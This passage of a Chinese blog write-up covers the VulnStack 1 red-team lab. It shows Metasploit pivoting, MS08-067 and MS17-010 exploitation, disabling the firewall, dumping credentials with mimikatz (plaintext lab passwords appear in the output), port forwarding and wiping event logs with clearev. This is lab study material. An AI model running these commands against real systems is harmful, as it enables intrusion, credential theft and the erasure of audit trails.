+<li>portscan 192.168.72.0/24 445 arp 200</li>
+</ul>
+<p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1ghztdxrfozj30gp0b3q3l.jpg" alt="image.png"></p>
+<p>工具栏 View-&gt;Targets 即可查看端口探测后的存活主机</p>
+<p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1ghztfwxa28j30go05taa3.jpg" alt="image.png"></p>
+<h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><p>添加路由，使用Web服务器作为跳板访问<code>Win2003</code>：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 192.168.72.0/24</span><br><span class="line">meterpreter &gt; run autoroute -p</span><br></pre></td></tr></table></figure>
+
+<h4 id="添加代理"><a href="#添加代理" class="headerlink" title="添加代理"></a>添加代理</h4><p>（添加路由一定要在挂代理之前，因为代理需要用到路由功能）</p>
+<p>这里添加 socks4a 代理，目的是为了让其他软件更方便的访问到内网的其他主机的服务</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/server/socks4a</span><br><span class="line">msf auxiliary(server/socks4a) &gt; <span class="built_in">set</span> srvport 1080</span><br></pre></td></tr></table></figure>
+
+<p>编辑 /etc/proxychains.conf ，添加 <code>127.0.0.1 1080</code></p>
+<p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1ggxquxza8xj30go050abd.jpg" alt="image.png"></p>
+<h4 id="渗透VM2"><a href="#渗透VM2" class="headerlink" title="渗透VM2"></a>渗透VM2</h4><p>使用 Nmap 做漏洞扫描：</p>
+<img src="http://ww1.sinaimg.cn/large/006nFhrCly1ggxqz1ktnij30ia0c3di5.jpg" width="600"/>
+
+<p>尝试使用 <code>ms08-067</code> 漏洞：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">msf5 exploit(multi/handler) &gt; use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">msf5 exploit(windows/smb/ms08_067_netapi) &gt; <span class="built_in">set</span> rhost 192.168.72.103</span><br><span class="line">msf5 exploit(windows/smb/ms08_067_netapi) &gt; <span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line">msf5 exploit(windows/smb/ms08_067_netapi) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<img src="http://ww1.sinaimg.cn/large/006nFhrCly1ggxq26ym2qj30jv085q55.jpg" width="600"/>
+
+<p>抓取哈希：mimikatz_command -f samdump::hashes</p>
+<p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1ggxq4zwz5jj30go05idgw.jpg" alt="image.png"></p>
+<p>端口转发：端口信息收集时注意到 W2k3 开启了21 端口 ，使用 Win7 的 Meterpreter 会话将 W2k3 的 21端口转发到本地</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; background  </span><br><span class="line">[*] Backgrounding session 2...</span><br><span class="line">msf5 exploit(windows/smb/ms08_067_netapi) &gt; sessions 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line">meterpreter &gt; portfwd add -L 192.168.54.1 -l 2121 -p 21 -r 192.168.72.103</span><br><span class="line">[*] Local TCP relay created: 192.168.54.1:2121 &lt;-&gt; 192.168.72.103:21</span><br></pre></td></tr></table></figure>
+
+<img src="http://ww1.sinaimg.cn/large/006nFhrCly1ggxqadrr0wj30l309q0t6.jpg" width="600"/>
+
+<h4 id="渗透域控"><a href="#渗透域控" class="headerlink" title="渗透域控"></a>渗透域控</h4><p>使用 Nmap 做漏洞扫描：</p>
+<img src="http://ww1.sinaimg.cn/large/006nFhrCly1ggxr03yrr0j30iv0fpad3.jpg" width="600"/>
+
+<p>尝试使用 <code>MS17-010</code>漏洞：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.72.102</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> <span class="string">"netsh advfirewall set allprofiles state off"</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>关掉防火墙</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">set rhosts 192.168.72.102</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>抓取明文：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">AuthID     Package    Domain        User           Password</span><br><span class="line">------     -------    ------        ----           --------</span><br><span class="line">0;1453714  Negotiate  GOD           liukaifeng01   hongrisec@2020</span><br><span class="line">0;1453702  Kerberos   GOD           liukaifeng01   hongrisec@2020</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="清理痕迹"><a href="#清理痕迹" class="headerlink" title="清理痕迹"></a>清理痕迹</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; clearev</span><br><span class="line">[*] Wiping 1474 records from Application...</span><br><span class="line">[*] Wiping 4836 records from System...</span><br><span class="line">[*] Wiping 41363 records from Security...</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>第一个内网的靶机，完整走了一遍内网渗透的流程</li>
+<li>通过本靶机学习到了 CobaltStrike 、 Meterpreter 两大神器在内网渗透中的使用方法</li>
+</ol>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><code>https://www.cnblogs.com/wkzb/p/12358076.html</code></p>
+<p><code>https://www.zrools.org/2020/03/09/VulnStack-ATT-CK红队评估实战-一-Writeup/</code></p>
+<p><strong>本文作者</strong>：shavchen<br /><strong>本文地址</strong>： <a href="https://shavchen.github.io/vulstack-1-writeup/">https://shavchen.github.io/vulstack-1-writeup/</a> <br /><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" target="_blank" rel="noopener">CC BY-NC-SA 3.0 CN</a> 许可协议。转载请注明出处！</p>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">
+  </div>
+  
+</article>
+
+
+<!-- <div id="ad-box">
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <ins class="adsbygoogle"
+         style="display:block"
+         data-ad-client="ca-pub-1769617155450062"
+         data-ad-slot="6920805491"
+         data-ad-format="link"
+         data-full-width-responsive="true"></ins>
+    <script>
+    (adsbygoogle = window.adsbygoogle || []).push({});
+    </script>
+</div> -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<div class="blog-post-comments"></div>
+<script>
+    new Valine({
+        el: '.blog-post-comments', 
+        app_id: 'DgMf1NChRFNzPlOrKd3gpBPk-gzGzoHsz', 	
+        app_key: 'rFtTafou49X7djrYTj4AN96G', 		    
+        placeholder: '说点什么?', 
+        avatar:'retro',
+        notify:true,
+        verify:true
+    });
+</script>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Article</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-number">1.</span> <span class="toc-text">环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#网络拓扑"><span class="toc-number">1.1.</span> <span class="toc-text">网络拓扑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vmware"><span class="toc-number">1.2.</span> <span class="toc-text">Vmware</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#资产"><span class="toc-number">2.</span> <span class="toc-text">资产</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IP-发现"><span class="toc-number">2.1.</span> <span class="toc-text">IP 发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#端口探测"><span class="toc-number">2.2.</span> <span class="toc-text">端口探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#资源探测"><span class="toc-number">2.3.</span> <span class="toc-text">资源探测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#打点"><span class="toc-number">3.</span> <span class="toc-text">打点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phpMyadmin"><span class="toc-number">3.1.</span> <span class="toc-text">phpMyadmin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#yxcms"><span class="toc-number">3.2.</span> <span class="toc-text">yxcms</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网"><span class="toc-number">4.</span> <span class="toc-text">内网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#远程登陆"><span class="toc-number">4.1.</span> <span class="toc-text">远程登陆</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF"><span class="toc-number">4.1.1.</span> <span class="toc-text">MSF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#隧道连接"><span class="toc-number">4.1.2.</span> <span class="toc-text">隧道连接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#信息收集"><span class="toc-number">4.2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Meterpreter"><span class="toc-number">4.2.1.</span> <span class="toc-text">Meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#哈希抓取"><span class="toc-number">4.2.1.1.</span> <span class="toc-text">哈希抓取</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#明文密码"><span class="toc-number">4.2.1.2.</span> <span class="toc-text">明文密码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#端口信息"><span class="toc-number">4.2.1.3.</span> <span class="toc-text">端口信息</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CobaltStrike"><span class="toc-number">4.2.2.</span> <span class="toc-text">CobaltStrike</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#获取beacon"><span class="toc-number">4.2.2.1.</span> <span class="toc-text">获取beacon</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#哈希抓取-1"><span class="toc-number">4.2.2.2.</span> <span class="toc-text">哈希抓取</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#存活探测"><span class="toc-number">4.2.2.3.</span> <span class="toc-text">存活探测</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#横向渗透"><span class="toc-number">4.3.</span> <span class="toc-text">横向渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#添加路由"><span class="toc-number">4.3.1.</span> <span class="toc-text">添加路由</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#添加代理"><span class="toc-number">4.3.2.</span> <span class="toc-text">添加代理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#渗透VM2"><span class="toc-number">4.3.3.</span> <span class="toc-text">渗透VM2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#渗透域控"><span class="toc-number">4.3.4.</span> <span class="toc-text">渗透域控</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#清理痕迹"><span class="toc-number">4.4.</span> <span class="toc-text">清理痕迹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://shavchen.github.io/vulstack-1-writeup/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://shavchen.github.io/vulstack-1-writeup/&text=vulstack 1 writeup" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://shavchen.github.io/vulstack-1-writeup/&title=vulstack 1 writeup" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://shavchen.github.io/vulstack-1-writeup/&is_video=false&description=vulstack 1 writeup" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=vulstack 1 writeup&body=Check out this article: https://shavchen.github.io/vulstack-1-writeup/" target="_blank" rel="noopener"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://shavchen.github.io/vulstack-1-writeup/&title=vulstack 1 writeup" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://shavchen.github.io/vulstack-1-writeup/&title=vulstack 1 writeup" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://shavchen.github.io/vulstack-1-writeup/&title=vulstack 1 writeup" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://shavchen.github.io/vulstack-1-writeup/&title=vulstack 1 writeup" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://shavchen.github.io/vulstack-1-writeup/&name=vulstack 1 writeup&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 shavchen
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Article</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
